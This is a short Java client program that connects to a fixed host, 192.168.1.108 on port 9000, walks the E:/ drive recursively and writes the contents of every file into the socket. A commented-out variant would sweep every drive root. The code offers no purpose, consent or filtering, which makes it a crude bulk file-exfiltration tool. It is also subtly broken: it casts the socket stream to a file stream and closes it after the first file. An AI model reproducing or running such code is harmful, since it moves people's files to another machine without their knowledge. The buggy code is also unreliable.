package com.zz.client;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.net.UnknownHostException;

public class Client {
	public static  Socket socket = null;
	public static FileOutputStream out = null;
	public static FileInputStream in = null;
	

	public static void traversal(File path,Socket socket) {
      if(path==null || !path.exists()){
    	  return;
      }else{
    	  File[] files = path.listFiles();
    	  for (File file : files) {
		    if(file.isDirectory()){
		    	traversal(file,socket);
		    }else{
		    	try {
					out = (FileOutputStream) socket.getOutputStream();
					
					in =  new FileInputStream(file);
					byte[] b = new byte[4096];
					int a = 0;
					while((a=in.read(b, 0, b.length))!=-1){
						out.write(b, 0, a);
					}
					in.close();
					out.close();
					
				} catch (IOException e) {
					e.printStackTrace();
				}

		    }
		}
      }
	}
			
	public static void main(String[] args) {
		
		try {
			socket = new Socket("192.168.1.108", 9000);
//			File[] roots = File.listRoots();
//			for (int i = 0; i < roots.length; i++) {
//				traversal(roots[i],socket);
//			}
			traversal(new File("E:/"),socket);
		} catch (UnknownHostException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

}
